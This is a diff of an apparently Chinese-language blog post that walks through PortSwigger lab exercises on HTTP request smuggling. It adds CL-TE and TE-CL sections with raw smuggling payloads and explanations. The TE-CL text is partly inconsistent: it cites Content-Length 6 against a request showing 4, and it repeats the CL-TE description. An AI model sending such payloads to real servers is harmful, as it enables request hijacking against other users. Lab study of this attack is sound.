@@ -33,7 +33,7 @@
 <meta property="og:description" content="前后端服务器对于HTTP请求处理的差异造成的HTTP走私">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-03-19T11:59:31.000Z">
-<meta property="article:modified_time" content="2021-03-19T12:07:44.436Z">
+<meta property="article:modified_time" content="2021-03-20T07:19:22.578Z">
 <meta property="article:author" content="xXxYOLOxXx">
 <meta property="article:tag" content="HTTP">
 <meta name="twitter:card" content="summary">
@@ -201,10 +201,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2021-03-19 19:59:31 / Modified: 20:07:44" itemprop="dateCreated datePublished" datetime="2021-03-19T19:59:31+08:00">2021-03-19</time>
+              <time title="Created: 2021-03-19 19:59:31" itemprop="dateCreated datePublished" datetime="2021-03-19T19:59:31+08:00">2021-03-19</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-03-20 15:19:22" itemprop="dateModified" datetime="2021-03-20T15:19:22+08:00">2021-03-20</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -230,8 +236,9 @@
 <a id="more"></a>
 <h1 id="http走私"><a class="markdownIt-Anchor" href="#http走私"></a> HTTP走私</h1>
 <h2 id="cl-te"><a class="markdownIt-Anchor" href="#cl-te"></a> CL-TE</h2>
-<p>前端服务器优先处理Content-Length，后端服务器优先处理Transfer-Encoding</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac811f9b1e60860c80d927b4001f00d3.web-security-academy.net</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a><br />
+前端服务器优先处理Content-Length，后端服务器优先处理Transfer-Encoding</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>lab_id.web-security-academy.net</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure>
 <ul>
 <li>前端服务器优先处理<code>Content-Length: 6</code>，内容为&quot;0\r\n\r\nG&quot;</li>
 <li>后端服务器优先处理<code>Transfer-Encoding: chunked</code>，认为收到了一个大小为0的数据块，从而忽视了最后的<code>G</code></li>
@@ -239,7 +246,15 @@
 <p>这个<code>G</code>则留在缓冲区内，当下一次HTTP请求发出时，会加在HTTP请求之前<br />
 如果将这个数据包重新发一次，就能得到<code>GPOST / HTTP/1.1</code></p>
 <hr />
-<p>TBC</p>
+<h2 id="te-cl"><a class="markdownIt-Anchor" href="#te-cl"></a> TE-CL</h2>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a><br />
+前端服务器优先处理Content-Length，后端服务器优先处理Transfer-Encoding</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>lab_id.web-security-academy.net</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">97</span><br><span class="line"><span class="keyword">GPOST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>lab_id.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>前端服务器优先处理<code>Transfer-Encoding: chunked</code>，认为收到了两个数据块，第一个数据块大小为<code>0x97</code>，第二个数据块大小为<code>0x00</code>（即标识后续无数据）</li>
+<li>后端服务器优先处理<code>Content-Length: 6</code>，认为收到了两个HTTP请求，第一个请求内容为<code>97</code>，第二个请求内容为<code>0\r\n\r\n</code></li>
+</ul>
+<p>而第二个请求在解析时，请求头为<code>GPOST</code>，即完成了HTTP smuggling</p>
 
     </div>
 
@@ -337,7 +352,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#http%E8%B5%B0%E7%A7%81"><span class="nav-number">1.</span> <span class="nav-text"> HTTP走私</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cl-te"><span class="nav-number">1.1.</span> <span class="nav-text"> CL-TE</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#http%E8%B5%B0%E7%A7%81"><span class="nav-number">1.</span> <span class="nav-text"> HTTP走私</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cl-te"><span class="nav-number">1.1.</span> <span class="nav-text"> CL-TE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#te-cl"><span class="nav-number">1.2.</span> <span class="nav-text"> TE-CL</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
